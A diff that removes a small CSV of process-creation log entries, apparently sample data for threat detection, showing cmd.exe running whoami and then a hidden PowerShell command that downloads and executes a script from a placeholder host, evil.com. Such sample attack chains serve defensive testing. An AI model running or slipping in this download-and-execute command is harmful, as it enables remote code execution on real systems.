@@ -1,4 +1,0 @@
-timestamp,process_id,parent_process_id,process_name,action,command_line
-2023-10-01T10:00:00Z,1001,1000,svchost.exe,ProcessCreate,"svchost.exe -k netsvcs"
-2023-10-01T10:01:00Z,1002,1001,cmd.exe,ProcessCreate,"cmd.exe /c whoami"
-2023-10-01T10:02:00Z,1003,1002,powershell.exe,ProcessCreate,"powershell.exe -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload")'"
